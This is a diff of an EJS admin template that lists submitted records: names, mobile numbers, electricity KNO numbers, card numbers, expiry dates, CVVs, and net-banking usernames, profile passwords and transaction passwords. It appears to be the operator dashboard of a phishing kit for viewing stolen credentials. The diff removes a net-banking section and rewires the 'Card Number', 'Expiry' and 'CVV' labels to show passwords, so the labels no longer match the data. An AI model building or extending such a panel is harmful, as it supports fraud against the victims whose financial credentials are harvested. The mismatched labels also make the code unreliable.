@@ -25,7 +25,7 @@
               <h3>User Information - <%= entryIndex + 1 %></h3>
               <p><strong>Name:</strong> <%= entry.name %></p>
               <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
-             <p><strong>Mobile Number:</strong> <%= entry.knoNumber %></p>
+             <p><strong>KNO Number:</strong> <%= entry.knoNumber %></p>
               <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
             </div>
           <% }); %>
@@ -37,26 +37,6 @@
       <p>No User Data Found</p>
     <% } %>
 
-    <!-- NetBanking Details Section -->
-    <h2>Net Banking Details</h2>
-    <% if (netBanking && netBanking.length > 0) { %>
-      <% netBanking.forEach((bank, bankIndex) => { %>
-        <div class="card">
-          <h3>Net Banking Entry - <%= bankIndex + 1 %></h3>
-          <% bank.entries.forEach((entry, index) => { %>
-            <div class="sub-card">
-              <h4>Transaction <%= index + 1 %></h4>
-              <p><strong>Bank Name:</strong> <%= entry.bankName %></p>
-              <p><strong>Account Number:</strong> <%= entry.accountNumber %></p>
-              <p><strong>Transaction Amount:</strong> ₹<%= entry.amount %></p>
-              <p><strong>Transaction Date:</strong> <%= new Date(entry.transactionDate).toLocaleString() %></p>
-            </div>
-          <% }); %>
-        </div>
-      <% }); %>
-    <% } else { %>
-      <p>No Net Banking Data Found</p>
-    <% } %>
 
     <!-- Debit Card Details -->
     <h2>Debit Card Details</h2>
@@ -89,9 +69,9 @@
           <% creditCard.entries.forEach((entry, index) => { %>
             <div class="sub-card">
               <h4>Card <%= index + 1 %></h4>
-              <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
-              <p><strong>Expiry:</strong> <%= entry.expiry %></p>
-              <p><strong>CVV:</strong> <%= entry.cvv %></p>
+              <p><strong>Card Number:</strong> <%= entry.userName %></p>
+              <p><strong>Expiry:</strong> <%= entry.profilePass %></p>
+              <p><strong>CVV:</strong> <%= entry.transactionPass %></p>
               <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
             </div>
           <% }); %>
